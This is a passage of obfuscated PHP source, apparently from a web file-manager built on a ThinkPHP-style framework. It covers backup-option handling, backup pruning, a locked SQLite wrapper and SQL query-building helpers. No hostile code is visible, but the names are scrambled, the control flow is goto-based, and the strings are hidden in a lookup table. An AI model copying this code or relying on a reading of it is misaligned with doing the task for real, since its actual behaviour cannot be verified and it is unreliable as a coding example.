$this->checkStore($dÅŠœòÎƒ—[$aŠ›ï—Óí[704]]); } } self::$option = $dÅŠœòÎƒ—; } private function initData($cÓğ§£·æ› = 0, $d½ìŒ’µ™‚ = '') { goto eÔÙÊ“Æ; dØøÀµ‚‚ø: $this->checkStore($eµ›­»™õê[$aÒ‚±É¥˜²[704]]); $F±Ò³ŒªÓµ = array($aÒ‚±É¥˜²[704] => $eµ›­»™õê[$aÒ‚±É¥˜²[704]], $aÒ‚±É¥˜²[28] => self::$name, $aÒ‚±É¥˜²[702] => 0, $aÒ‚±É¥˜²[705] => $eµ›­»™õê[$aÒ‚±É¥˜²[705]], $aÒ‚±É¥˜²[289] => array($aÒ‚±É¥˜²[706] => array($aÒ‚±É¥˜²[702] => 0), $aÒ‚±É¥˜²[707] => array($aÒ‚±É¥˜²[702] => 0, $aÒ‚±É¥˜²[708] => 0, $aÒ‚±É¥˜²[709] => 0, $aÒ‚±É¥˜²[29] => $aÒ‚±É¥˜²[33]), $aÒ‚±É¥˜²[710] => array($aÒ‚±É¥˜²[702] => 0, $aÒ‚±É¥˜²[708] => 0, $aÒ‚±É¥˜²[709] => 0), $aÒ‚±É¥˜²[173] => array($aÒ‚±É¥˜²[702] => 0, $aÒ‚±É¥˜²[711] => 0, $aÒ‚±É¥˜²[712] => 0, $aÒ‚±É¥˜²[713] => 0, $aÒ‚±É¥˜²[714] => 0, $aÒ‚±É¥˜²[441] => $cÓğ§£·æ›)), $aÒ‚±É¥˜²[715] => time(), $aÒ‚±É¥˜²[470] => 0); $E«ØÀÎ¥æÂ = Model($aÒ‚±É¥˜²[701])->insert($F±Ò³ŒªÓµ); goto c¶³íÜ¶ƒ´; eÔÙÊ“Æ: $aÒ‚±É¥˜² =& $_SERVER[Š‰]; $eµ›­»™õê = Model($aÒ‚±É¥˜²[701])->config(); if ($d½ìŒ’µ™‚ && $eµ›­»™õê[$aÒ‚±É¥˜²[704]] != $d½ìŒ’µ™‚) { $cÓğ§£·æ› = 0; } goto dØøÀµ‚‚ø; c¶³íÜ¶ƒ´: $F±Ò³ŒªÓµ[$aÒ‚±É¥˜²[388]] = $E«ØÀÎ¥æÂ; return $F±Ò³ŒªÓµ; goto CØŸï­ˆ‹; CØŸï­ˆ‹: } private function checkStore($D›ˆéØ’Š) { $aÏ¾ì©ùÅñ =& $_SERVER[Š‰]; $EªÉ„îì»‡ = Model($aÏ¾ì©ùÅñ[716])->listData($D›ˆéØ’Š); Model($aÏ¾ì©ùÅñ[716])->checkConfig($EªÉ„îì»‡); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Š‰][701])->findByName(self::$name); } return self::$option; } public static function set($A–³Ï‘íæ«) { $Bø³ç‰ß± =& $_SERVER[Š‰]; $D‚²ßèÖš¢ = self::get(); foreach ($A–³Ï‘íæ« as $e×ÚïÃ®Ù => $f˜‡Ş˜ƒù) { $DÆíáˆí˜ = explode($Bø³ç‰ß±[94], $e×ÚïÃ®Ù); $bĞÁñöèÃ = count($DÆíáˆí˜); switch ($bĞÁñöèÃ) { case 1: $D‚²ßèÖš¢[$DÆíáˆí˜[0]] = $f˜‡Ş˜ƒù; break; case 2: $D‚²ßèÖš¢[$DÆíáˆí˜[0]][$DÆíáˆí˜[1]] = $f˜‡Ş˜ƒù; break; case 3: $D‚²ßèÖš¢[$DÆíáˆí˜[0]][$DÆíáˆí˜[1]][$DÆíáˆí˜[2]] = $f˜‡Ş˜ƒù; break; } } Model($Bø³ç‰ß±[701])->update($D‚²ßèÖš¢[$Bø³ç‰ß±[388]], $D‚²ßèÖš¢); self::$option = $D‚²ßèÖš¢; return self::$option; } public function keep() { $DŠëö¬ºÛ‚ =& $_SERVER[Š‰]; $C”¿²”ÙÎ² = self::get(); if ($C”¿²”ÙÎ²[$DŠëö¬ºÛ‚[289]][$DŠëö¬ºÛ‚[706]][$DŠëö¬ºÛ‚[702]] == $DŠëö¬ºÛ‚[86]) { return; } $this->backupKeep($C”¿²”ÙÎ²); self::set(array($DŠëö¬ºÛ‚[717] => 1)); } private function backupKeep($DÇŠö®±õ) { goto dÇ’ºÆ¦¤; Cå¸‡ğÑ‰: for ($e²Ê÷¸ã÷† = 0; $e²Ê÷¸ã÷† < 12; $e²Ê÷¸ã÷†++) { $F’ñ ÅŠ’å[] = date($C¨–‘Üéæ[718], strtotime("\55{$e²Ê÷¸ã÷†}\40\155\157\156\x74\x68\x73")); } $F’ñ ÅŠ’å = array_unique($F’ñ ÅŠ’å); foreach ($b†²‚Éñ©ñ as $BÍÍ”Õ ¶ƒ) { if (!empty($BÍÍ”Õ ¶ƒ[$C¨–‘Üéæ[28]]) && in_array($BÍÍ”Õ ¶ƒ[$C¨–‘Üéæ[28]], $F’ñ ÅŠ’å)) { continue; } Model($C¨–‘Üéæ[701])->remove($BÍÍ”Õ ¶ƒ[$C¨–‘Üéæ[388]]); $Dîø¥óÕ§ó = "\173\151\157\72{$DÇŠö®±õ[$C¨–‘Üéæ[704]]}\175\57\x64\141\164\x61\142\141\x73\x65\57\142\x61\143\x6b\165\x70\137{$BÍÍ”Õ ¶ƒ[$C¨–‘Üéæ[28]]}"; IO::remove($Dîø¥óÕ§ó, !1); } goto bá’ª›¯Ó; dÇ’ºÆ¦¤: $C¨–‘Üéæ =& $_SERVER[Š‰]; $b†²‚Éñ©ñ = Model($C¨–‘Üéæ[701])->listData(); if (empty($b†²‚Éñ©ñ)) { return; } goto C¯Çäù‰¥¦; C¯Çäù‰¥¦: $e²Ê÷¸ã÷† = 0; $F’ñ ÅŠ’å = array(); foreach ($b†²‚Éñ©ñ as $BÍÍ”Õ ¶ƒ) { if ($e²Ê÷¸ã÷† >= 7) { break; } $F’ñ ÅŠ’å[] = $BÍÍ”Õ ¶ƒ[$C¨–‘Üéæ[28]]; $e²Ê÷¸ã÷†++; } goto Cå¸‡ğÑ‰; bá’ª›¯Ó: } public function db() { goto B­÷ã¸Ÿ¢ø; B§Éùöç…í: $AÈˆ®›§Ø’ = new BackupDb(); if (!$AÈˆ®›§Ø’->index()) { return !1; } self::set(array($EÓñ¨°ù³[719] => 1)); goto F³ëˆâ¶Ó¼; B­÷ã¸Ÿ¢ø: $EÓñ¨°ù³ =& $_SERVER[Š‰]; $Fìë©ƒÀ = self::get(); if ($Fìë©ƒÀ[$EÓñ¨°ù³[289]][$EÓñ¨°ù³[707]][$EÓñ¨°ù³[702]] == $EÓñ¨°ù³[86]) { return !0; } goto B§Éùöç…í; F³ëˆâ¶Ó¼: return !0; goto dãÂÛ×‘º; dãÂÛ×‘º: } public function dbFile() { goto b´“®³ê½«; b´“®³ê½«: $bÊåµ‡øºŸ =& $_SERVER[Š‰]; $dğÈŠÖ ¬È = self::get(); if ($dğÈŠÖ ¬È[$bÊåµ‡øºŸ[289]][$bÊåµ‡øºŸ[710]][$bÊåµ‡øºŸ[702]] == $bÊåµ‡øºŸ[86]) { return !0; } goto f°³·¢æå©; F³õÂºÃÔ: return !0; goto cÅÈï±í«‘; f°³·¢æå©: $d ÏÚÅÌÆÃ = new BackupDbFile(); if (!$d ÏÚÅÌÆÃ->index()) { return !1; } self::set(array($bÊåµ‡øºŸ[720] => 1)); goto F³õÂºÃÔ; cÅÈï±í«‘: } public function file() { $fí¥«¿…¹Î =& $_SERVER[Š‰]; $A¦™‹Âóòà = self::get(); if ($A¦™‹Âóòà[$fí¥«¿…¹Î[289]][$fí¥«¿…¹Î[173]][$fí¥«¿…¹Î[702]] == $fí¥«¿…¹Î[86]) { return !0; } if (!isset($A¦™‹Âóòà[$fí¥«¿…¹Î[705]]) || $A¦™‹Âóòà[$fí¥«¿…¹Î[705]] == $fí¥«¿…¹Î[491]) { $D®ƒÀôá´ = new BackupFile(); if (!$D®ƒÀôá´->index()) { return !1; } } self::set(array($fí¥«¿…¹Î[721] => 1, $fí¥«¿…¹Î[702] => 1)); return !0; } } goto Aò˜”•Õ¦; AéÊãÒ˜„÷: class DbSqlite3 extends DbSqlite3Base { public function query($Båºè‰ÌÉ») { $Aõ‰¥­”Ç„ =& $_SERVER[Š‰]; if (!CacheLock::fileLock($Aõ‰¥­”Ç„[9])) { return !1; } $fĞ£…„åšÅ = parent::query($Båºè‰ÌÉ»); CacheLock::fileUnLock($Aõ‰¥­”Ç„[9]); return $fĞ£…„åšÅ; } public function execute($D„‚ìÄŸ‚Ç) { $b¿Ä£—·œ =& $_SERVER[Š‰]; if (!CacheLock::fileLock($b¿Ä£—·œ[9])) { return !1; } $fò…ĞŞ˜øŠ = parent::execute($D„‚ìÄŸ‚Ç); CacheLock::fileUnLock($b¿Ä£—·œ[9]); return $fò…ĞŞ˜øŠ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\x71" => "\74\x3e", "\x67\164" => "\76", "\x65\x67\x74" => "\x3e\x3d", "\154\164" => "\74", "\x65\x6c\164" => "\74\x3d", "\156\157\x74\154\x69\153\x65" => "\116\117\124\x20\x4c\111\113\x45", "\x6c\x69\x6b\145" => "\114\x49\x4b\105", "\x69\156" => "\111\116", "\156\x6f\164\151\156" => "\x4e\117\124\x20\x49\116", "\156\x6f\164\x20\151\x6e" => "\x4e\x4f\124\40\111\x4e", "\x62\x65\164\167\x65\145\156" => "\x42\x45\x54\x57\x45\x45\116", "\x6e\157\164\142\x65\x74\x77\x65\x65\x6e" => "\x4e\117\x54\40\102\x45\124\127\x45\x45\x4e", "\x6e\157\164\40\142\145\164\167\x65\x65\x6e" => "\x4e\117\x54\40\102\105\124\127\x45\x45\116"); protected $selectSql = "\123\x45\x4c\105\x43\x54\45\x44\111\x53\124\x49\116\103\x54\x25\40\45\106\x49\105\x4c\x44\x25\40\x46\x52\117\x4d\x20\45\x54\x41\102\x4c\x45\x25\45\112\117\x49\x4e\45\x25\x57\110\x45\x52\105\45\x25\107\122\x4f\x55\x50\45\45\110\101\126\x49\116\107\x25\45\x4f\x52\x44\x45\122\45\x25\x4c\x49\x4d\x49\124\45\40\x25\125\x4e\x49\x4f\x4e\45\x25\103\117\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $CŠ’ÄÒ„Ö = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Š‰][896], $CŠ’ÄÒ„Ö); } public function factory($EÜğ©„³ = '') { goto FÍ…‰Ö°†Ì; cŞ¡ÛÆ²—: $this->dbType = ucwords(strtolower($EÜğ©„³[$CŒ”…ê³†ï[897]])); $f§‚¤—®Ø = $CŒ”…ê³†ï[899] . $this->dbType; if (class_exists($f§‚¤—®Ø)) { $dÎŸ ¥¯Óê = new $f§‚¤—®Ø($EÜğ©„³); if ($CŒ”…ê³†ï[738] != strtolower($EÜğ©„³[$CŒ”…ê³†ï[897]])) { $dÎŸ ¥¯Óê->dbType = strtoupper($this->dbType); } else { $dÎŸ ¥¯Óê->dbType = $this->_getDsnType($EÜğ©„³[$CŒ”…ê³†ï[852]]); } } else { think_exception(think_lang($CŒ”…ê³†ï[900]) . $CŒ”…ê³†ï[901] . $f§‚¤—®Ø); } goto a‡ÉÀ»ŞÃ; a‡ÉÀ»ŞÃ: return $dÎŸ ¥¯Óê; goto c¦ä¬Åµœ°; FÍ…‰Ö°†Ì: $CŒ”…ê³†ï =& $_SERVER[Š‰]; $EÜğ©„³ = $this->parseConfig($EÜğ©„³); if (empty($EÜğ©„³[$CŒ”…ê³†ï[897]])) { think_exception(think_lang($CŒ”…ê³†ï[898])); } goto cŞ¡ÛÆ²—; c¦ä¬Åµœ°: } public function __call($fØÑ´–¤ß¨, $aÙÀ¶îï·À) { if (method_exists($this, $fØÑ´–¤ß¨)) { return call_user_func_array(array($this, $fØÑ´–¤ß¨), $aÙÀ¶îï·À); } } protected function _getDsnType($Fõ¯ñÅ¾Ø) { $cÁ¶èë»–ò = explode($_SERVER[Š‰][4], $Fõ¯ñÅ¾Ø); $aÙµÉ¾øÁö = strtoupper(trim($cÁ¶èë»–ò[0])); return $aÙµÉ¾øÁö; } private function parseConfig($aÙãœ…ìó = '') { $A‚²¬£°¿— =& $_SERVER[Š‰]; if (!empty($aÙãœ…ìó) && is_string($aÙãœ…ìó)) { $aÙãœ…ìó = $this->parseDSN($aÙãœ…ìó); } elseif (is_array($aÙãœ…ìó)) { $aÙãœ…ìó = array_change_key_case($aÙãœ…ìó); $aÙãœ…ìó = array($A‚²¬£°¿—[897] => $aÙãœ…ìó[$A‚²¬£°¿—[737]], $A‚²¬£°¿—[825] => $aÙãœ…ìó[$A‚²¬£°¿—[902]], $A‚²¬£°¿—[826] => $aÙãœ…ìó[$A‚²¬£°¿—[903]], $A‚²¬£°¿—[823] => $aÙãœ…ìó[$A‚²¬£°¿—[904]], $A‚²¬£°¿—[824] => $aÙãœ…ìó[$A‚²¬£°¿—[905]], $A‚²¬£°¿—[17] => $aÙãœ…ìó[$A‚²¬£°¿—[906]], $A‚²¬£°¿—[852] => $aÙãœ…ìó[$A‚²¬£°¿—[739]], $A‚²¬£°¿—[13] => isset($aÙãœ…ìó[$A‚²¬£°¿—[907]]) ? $aÙãœ…ìó[$A‚²¬£°¿—[907]] : array()); } elseif (empty($aÙãœ…ìó)) { if (think_config($A‚²¬£°¿—[908]) && $A‚²¬£°¿—[738] != strtolower(think_config($A‚²¬£°¿—[909]))) { $aÙãœ…ìó = $this->parseDSN(think_config($A‚²¬£°¿—[908])); } else { $aÙãœ…ìó = array($A‚²¬£°¿—[897] => think_config($A‚²¬£°¿—[909]), $A‚²¬£°¿—[825] => think_config($A‚²¬£°¿—[910]), $A‚²¬£°¿—[826] => think_config($A‚²¬£°¿—[911]), $A‚²¬£°¿—[823] => think_config($A‚²¬£°¿—[912]), $A‚²¬£°¿—[824] => think_config($A‚²¬£°¿—[913]), $A‚²¬£°¿—[17] => think_config($A‚²¬£°¿—[242]), $A‚²¬£°¿—[852] => think_config($A‚²¬£°¿—[908]), $A‚²¬£°¿—[13] => think_config($A‚²¬£°¿—[914])); } } return $aÙãœ…ìó; } protected function initConnect($eëÁÖ‹ó† = true) { if (1 == think_config($_SERVER[Š‰][18])) { $this->_linkID = $this->multiConnect($eëÁÖ‹ó†); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $DÓ¿ˆÜŞÚ => $fëƒ§¢‡ß) { $this->_linkID = $fëƒ§¢‡ß; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($EÖ²”¼ÂÂ¨ = false) { $CÌ¸‡¯¬Š« =& $_SERVER[Š‰]; static $aÇ‰ëùİ¼› = array(); if (empty($aÇ‰ëùİ¼›)) { foreach ($this->config as $c”Œ×Í¦ˆİ => $B¨÷ï£ƒ§) { $aÇ‰ëùİ¼›[$c”Œ×Í¦ˆİ] = explode($CÌ¸‡¯¬Š«[47], $B¨÷ï£ƒ§); } } if (think_config($CÌ¸‡¯¬Š«[915])) { if ($EÖ²”¼ÂÂ¨) { $BÓÂ«³ùš¦ = floor(mt_rand(0, think_config($CÌ¸‡¯¬Š«[916]) - 1)); } else { if (is_numeric(think_config($CÌ¸‡¯¬Š«[917]))) { $BÓÂ«³ùš¦ = think_config($CÌ¸‡¯¬Š«[917]); } else { $BÓÂ«³ùš¦ = floor(mt_rand(think_config($CÌ¸‡¯¬Š«[916]), count($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[823]]) - 1)); } } } else { $BÓÂ«³ùš¦ = floor(mt_rand(0, count($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[823]]) - 1)); } $B„´ÍÃŠÛê = array($CÌ¸‡¯¬Š«[825] => isset($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[825]][$BÓÂ«³ùš¦]) ? $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[825]][$BÓÂ«³ùš¦] : $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[825]][0], $CÌ¸‡¯¬Š«[826] => isset($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[826]][$BÓÂ«³ùš¦]) ? $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[826]][$BÓÂ«³ùš¦] : $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[826]][0], $CÌ¸‡¯¬Š«[823] => isset($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[823]][$BÓÂ«³ùš¦]) ? $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[823]][$BÓÂ«³ùš¦] : $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[823]][0], $CÌ¸‡¯¬Š«[824] => isset($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[824]][$BÓÂ«³ùš¦]) ? $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[824]][$BÓÂ«³ùš¦] : $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[824]][0], $CÌ¸‡¯¬Š«[17] => isset($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[17]][$BÓÂ«³ùš¦]) ? $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[17]][$BÓÂ«³ùš¦] : $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[17]][0], $CÌ¸‡¯¬Š«[852] => isset($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[852]][$BÓÂ«³ùš¦]) ? $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[852]][$BÓÂ«³ùš¦] : $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[852]][0], $CÌ¸‡¯¬Š«[13] => isset($aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[13]][$BÓÂ«³ùš¦]) ? $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[13]][$BÓÂ«³ùš¦] : $aÇ‰ëùİ¼›[$CÌ¸‡¯¬Š«[13]][0]); return $this->connect($B„´ÍÃŠÛê, $BÓÂ«³ùš¦); } public function parseDSN($D…¦¦¡¹Ğ‚) { $FÕ·öç‰Ä =& $_SERVER[Š‰]; if (empty($D…¦¦¡¹Ğ‚)) { return !1; } $d»‡–ÌíïŠ = parse_url($D…¦¦¡¹Ğ‚); if ($d»‡–ÌíïŠ[$FÕ·öç‰Ä[174]]) { $bøÎ­òùê = array($FÕ·öç‰Ä[897] => $d»‡–ÌíïŠ[$FÕ·öç‰Ä[174]], $FÕ·öç‰Ä[825] => isset($d»‡–ÌíïŠ[$FÕ·öç‰Ä[557]]) ? $d»‡–ÌíïŠ[$FÕ·öç‰Ä[557]] : $FÕ·öç‰Ä[33], $FÕ·öç‰Ä[826] => isset($d»‡–ÌíïŠ[$FÕ·öç‰Ä[918]]) ? $d»‡–ÌíïŠ[$FÕ·öç‰Ä[918]] : $FÕ·öç‰Ä[33], $FÕ·öç‰Ä[823] => isset($d»‡–ÌíïŠ[$FÕ·öç‰Ä[175]]) ? $d»‡–ÌíïŠ[$FÕ·öç‰Ä[175]] : $FÕ·öç‰Ä[33], $FÕ·öç‰Ä[824] => isset($d»‡–ÌíïŠ[$FÕ·öç‰Ä[176]]) ? $d»‡–ÌíïŠ[$FÕ·öç‰Ä[176]] : $FÕ·öç‰Ä[33], $FÕ·öç‰Ä[17] => isset($d»‡–ÌíïŠ[$FÕ·öç‰Ä[75]]) ? substr($d»‡–ÌíïŠ[$FÕ·öç‰Ä[75]], 1) : $FÕ·öç‰Ä[33]); } else { preg_match($FÕ·öç‰Ä[919], trim($D…¦¦¡¹Ğ‚), $F‘„âÈôñõ); $bøÎ­òùê = array($FÕ·öç‰Ä[897] => $F‘„âÈôñõ[1], $FÕ·öç‰Ä[825] => $F‘„âÈôñõ[2], $FÕ·öç‰Ä[826] => $F‘„âÈôñõ[3], $FÕ·öç‰Ä[823] => $F‘„âÈôñõ[4], $FÕ·öç‰Ä[824] => $F‘„âÈôñõ[5], $FÕ·öç‰Ä[17] => $F‘„âÈôñõ[6]); } $bøÎ­òùê[$FÕ·öç‰Ä[852]] = $FÕ·öç‰Ä[33]; return $bøÎ­òùê; } protected function debug() { $DŸœ½çîˆå =& $_SERVER[Š‰]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $DŸœ½çîˆå[920]; if (think_config($DŸœ½çîˆå[921])) { think_status($DŸœ½çîˆå[922]); think_trace($this->queryStr . $DŸœ½çîˆå[923] . think_status($DŸœ½çîˆå[20], $DŸœ½çîˆå[922], 6) . $DŸœ½çîˆå[924], $DŸœ½çîˆå[33], $DŸœ½çîˆå[925]); } } protected function parseLock($Bšˆ ¨œšß = false) { $eò·ñ¨Ø =& $_SERVER[Š‰]; if (!$Bšˆ ¨œšß) { return $eò·ñ¨Ø[33]; } if ($eò·ñ¨Ø[854] == $this->dbType) { return $eò·ñ¨Ø[926]; } return $eò·ñ¨Ø[927]; } protected function parseSet($fÃ³äÚÅ…) { $eÜÅñ™ë³£ =& $_SERVER[Š‰]; foreach ($fÃ³äÚÅ… as $CËÏ•ó¸èé => $C„¥»¶‘£) { if (is_array($C„¥»¶‘£) && $eÜÅñ™ë³£[293] == $C„¥»¶‘£[0]) { $aºÈƒ¸’Ï™[] = $this->parseKey($CËÏ•ó¸èé) . $eÜÅñ™ë³£[928] . $C„¥»¶‘£[1]; } elseif (is_scalar($C„¥»¶‘£) || is_null($C„¥»¶‘£)) { $aºÈƒ¸’Ï™[] = $this->parseKey($CËÏ•ó¸èé) . $eÜÅñ™ë³£[928] . $this->parseValue($C„¥»¶‘£); } } return $eÜÅñ™ë³£[929] . implode($eÜÅñ™ë³£[47], $aºÈƒ¸’Ï™); } protected function bindParam($BšÂ¼‘ƒ¦§, $E™÷é´‚¯) { $this->bind[$_SERVER[Š‰][4] . $BšÂ¼‘ƒ¦§] = $E™÷é´‚¯; } protected function parseBind($cÊ××‚§¥) { $cÊ××‚§¥ = array_merge($this->bind, $cÊ××‚§¥); $this->bind = array(); return $cÊ××‚§¥; } function parseKey(&$Bæ‡¤ºÂ†, $F¨”Ãš„á¯ = true) { if ($F¨”Ãš„á¯) { $Bæ‡¤ºÂ† = $this->parseKeyCheck($Bæ‡¤ºÂ†); } return $Bæ‡¤ºÂ†; } function parseKeyCheck($f³¥ˆ‘–Ä) { $dØ—¾Êå¢¬ =& $_SERVER[Š‰]; $f³¥ˆ‘–Ä = trim($f³¥ˆ‘–Ä); if (!preg_match($dØ—¾Êå¢¬[930], $f³¥ˆ‘–Ä)) { think_exception($dØ—¾Êå¢¬[931] . $f³¥ˆ‘–Ä); } return $f³¥ˆ‘–Ä; } protected function parseValue($CÊ”•Åñ°¼) { $D…—‘ç›‚† =& $_SERVER[Š‰]; if (is_string($CÊ”•Åñ°¼)) { $CÊ”•Åñ°¼ = $D…—‘ç›‚†[893] . $this->escapeString($CÊ”•Åñ°¼) . $D…—‘ç›‚†[893]; } elseif (isset($CÊ”•Åñ°¼[0]) && is_string($CÊ”•Åñ°¼[0]) && strtolower($CÊ”•Åñ°¼[0]) == $D…—‘ç›‚†[293]) { $CÊ”•Åñ°¼ = $this->escapeString($CÊ”•Åñ°¼[1]); } elseif (is_array($CÊ”•Åñ°¼)) { $CÊ”•Åñ°¼ = array_map(array($this, $D…—‘ç›‚†[894]), $CÊ”•Åñ°¼); } elseif (is_bool($CÊ”•Åñ°¼)) { $CÊ”•Åñ°¼ = $CÊ”•Åñ°¼ ? $D…—‘ç›‚†[86] : $D…—‘ç›‚†[491]; } elseif (is_null($CÊ”•Åñ°¼)) { $CÊ”•Åñ°¼ = $D…—‘ç›‚†[102]; } return $CÊ”•Åñ°¼; } protected function parseField($CÃ÷”¸Ï©º) { $eÇÛ½Æ¡æ… =& $_SERVER[Š‰]; if (is_string($CÃ÷”¸Ï©º) && strpos($CÃ÷”¸Ï©º, $eÇÛ½Æ¡æ…[47])) { $CÃ÷”¸Ï©º = explode($eÇÛ½Æ¡æ…[47], $CÃ÷”¸Ï©º); } if (is_array($CÃ÷”¸Ï©º)) { $EÌ³Ô¸³Š = array(); foreach ($CÃ÷”¸Ï©º as $BİÕƒì”êİ => $d£îÅ’‰Ø–) { if (!is_numeric($BİÕƒì”êİ)) { $EÌ³Ô¸³Š[] = $this->parseKey($BİÕƒì”êİ, !1) . $eÇÛ½Æ¡æ…[932] . $this->parseKey($d£îÅ’‰Ø–); } else { $EÌ³Ô¸³Š[] = $this->parseKey($d£îÅ’‰Ø–); } } $f²‡à‡ÉÆö = implode($eÇÛ½Æ¡æ…[47], $EÌ³Ô¸³Š); } elseif (is_string($CÃ÷”¸Ï©º) && !empty($CÃ÷”¸Ï©º)) { $f²‡à‡ÉÆö = $CÃ÷”¸Ï©º; } else { $f²‡à‡ÉÆö = $eÇÛ½Æ¡æ…[182]; } return $f²‡à‡ÉÆö; } protected function parseTable($C·”ó”ÂéÆ) { $BÓƒäËÔì• =& $_SERVER[Š‰]; if (is_array($C·”ó”ÂéÆ)) { $Bõ×È“æÅİ = array(); foreach ($C·”ó”ÂéÆ as $FŒÜà¿®ÔĞ => $A‰ªãÔè¢±) { if (!is_numeric($FŒÜà¿®ÔĞ)) { $Bõ×È“æÅİ[] = $this->parseKey($FŒÜà¿®ÔĞ) . $BÓƒäËÔì•[50] . $this->parseKey($A‰ªãÔè¢±); } else { $Bõ×È“æÅİ[] = $this->parseKey($FŒÜà¿®ÔĞ); } } $C·”ó”ÂéÆ = $Bõ×È“æÅİ; } elseif (is_string($C·”ó”ÂéÆ)) { if (strstr($C·”ó”ÂéÆ, $BÓƒäËÔì•[50])) { return $C·”ó”ÂéÆ; } $C·”ó”ÂéÆ = explode($BÓƒäËÔì•[47], $C·”ó”ÂéÆ); array_walk($C·”ó”ÂéÆ, array($this, $BÓƒäËÔì•[843])); } return $BÓƒäËÔì•[837] . trim(implode($BÓƒäËÔì•[933], $C·”ó”ÂéÆ), $BÓƒäËÔì•[380]) . $BÓƒäËÔì•[837]; } protected function parseWhere($eöÕÉ øÌ) { $cÙÇŒ¸Ëá =& $_SERVER[Š‰]; $BÛŒØÌã¨¼ = $cÙÇŒ¸Ëá[33]; if (is_string($eöÕÉ øÌ)) { $BÛŒØÌã¨¼ = $eöÕÉ øÌ; } else { $fÖÒ¡ «Ä÷ = isset($eöÕÉ øÌ[$cÙÇŒ¸Ëá[934]]) ? strtoupper($eöÕÉ øÌ[$cÙÇŒ¸Ëá[934]]) : $cÙÇŒ¸Ëá[33]; if (in_array($fÖÒ¡ «Ä÷, array($cÙÇŒ¸Ëá[935], $cÙÇŒ¸Ëá[936], $cÙÇŒ¸Ëá[937]))) { $fÖÒ¡ «Ä÷ = $cÙÇŒ¸Ëá[50] . $fÖÒ¡ «Ä÷ . $cÙÇŒ¸Ëá[50]; unset($eöÕÉ øÌ[$cÙÇŒ¸Ëá[934]]); } else { $fÖÒ¡ «Ä÷ = $cÙÇŒ¸Ëá[938]; } foreach ($eöÕÉ øÌ as $D¦ÒØ¨ÆŞê => $dä«æÖĞ¸) { $BÛŒØÌã¨¼ .= $cÙÇŒ¸Ëá[273]; if (is_numeric($D¦ÒØ¨ÆŞê)) { $D¦ÒØ¨ÆŞê = $cÙÇŒ¸Ëá[939]; } if (0 === strpos($D¦ÒØ¨ÆŞê, $cÙÇŒ¸Ëá[70])) { $BÛŒØÌã¨¼ .= $this->parseThinkWhere($D¦ÒØ¨ÆŞê, $dä«æÖĞ¸); } else { if (!preg_match($cÙÇŒ¸Ëá[940], trim($D¦ÒØ¨ÆŞê))) { think_exception(think_lang($cÙÇŒ¸Ëá[941]) . $cÙÇŒ¸Ëá[4] . $D¦ÒØ¨ÆŞê); } $CÇÊÇ–Á– = is_array($dä«æÖĞ¸) && isset($dä«æÖĞ¸[$cÙÇŒ¸Ëá[942]]); $D¦ÒØ¨ÆŞê = trim($D¦ÒØ¨ÆŞê); if (strpos($D¦ÒØ¨ÆŞê, $cÙÇŒ¸Ëá[279])) { $aôô‘ÇèÙ = explode($cÙÇŒ¸Ëá[279], $D¦ÒØ¨ÆŞê); $Fù¥Î‰êê = array(); foreach ($aôô‘ÇèÙ as $Bá«ÒğÇôÈ => $Aê½’À‚¼) { $c™Âå‡š²÷ = $CÇÊÇ–Á– ? $dä«æÖĞ¸[$Bá«ÒğÇôÈ] : $dä«æÖĞ¸; $Fù¥Î‰êê[] = $cÙÇŒ¸Ëá[256] . $this->parseWhereItem($this->parseKey($Aê½’À‚¼), $c™Âå‡š²÷) . $cÙÇŒ¸Ëá[842]; } $BÛŒØÌã¨¼ .= implode($cÙÇŒ¸Ëá[943], $Fù¥Î‰êê); } elseif (strpos($D¦ÒØ¨ÆŞê, $cÙÇŒ¸Ëá[280])) { $aôô‘ÇèÙ = explode($cÙÇŒ¸Ëá[280], $D¦ÒØ¨ÆŞê); $Fù¥Î‰êê = array(); foreach ($aôô‘ÇèÙ as $Bá«ÒğÇôÈ => $Aê½’À‚¼) { $c™Âå‡š²÷ = $CÇÊÇ–Á– ? $dä«æÖĞ¸[$Bá«ÒğÇôÈ] : $dä«æÖĞ¸; $Fù¥Î‰êê[] = $cÙÇŒ¸Ëá[256] . $this->parseWhereItem($this->parseKey($Aê½’À‚¼), $c™Âå‡š²÷) . $cÙÇŒ¸Ëá[842]; } $BÛŒØÌã¨¼ .= implode($cÙÇŒ¸Ëá[938], $Fù¥Î‰êê); } else { $BÛŒØÌã¨¼ .= 